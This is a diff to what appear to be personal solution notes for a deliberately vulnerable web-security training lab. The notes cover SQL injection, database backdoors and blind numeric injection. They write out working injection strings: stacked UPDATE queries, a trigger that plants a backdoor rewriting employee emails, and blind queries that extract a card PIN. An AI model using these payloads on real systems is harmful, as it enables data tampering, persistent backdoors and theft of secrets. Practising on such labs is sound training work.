@@ -177,6 +177,12 @@ Start OWASP Proxy and open a browser (I am using firefox) that is preconfigured 
    9.7 LAB: SQL Injection (Stage 3)
    A.  No Solution could be figured WITHOUT
    9.8 Database Backdoors
-   A.  First Step: enter "101 or 1=1" without quotes and check your data.
-       Second: Enter "101 or 1=1; UPDATE employee SET Salary=100000 WHERE userid=101"
-       This will update the row entry in database. 
+   A.  First Step: enter "101" without quotes and check your data.
+       Second: Enter "101; UPDATE employee SET Salary=100000 WHERE userid=101"
+       This will update the row entry in database.
+       Stage 2: CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='hacker@email.com' WHERE userd=NEW.userid
+   9.9 Blind Numeric SQL injection
+       Start with "101 AND 1=2"
+       Final Answer: "101 and ((SELECT pin FROM pins WHERE cc_number='111122223333') > 10000);"
+       "101 and ((SELECT pin FROM pins WHERE cc_number='111122223333') = 2364);"
+  9.10 
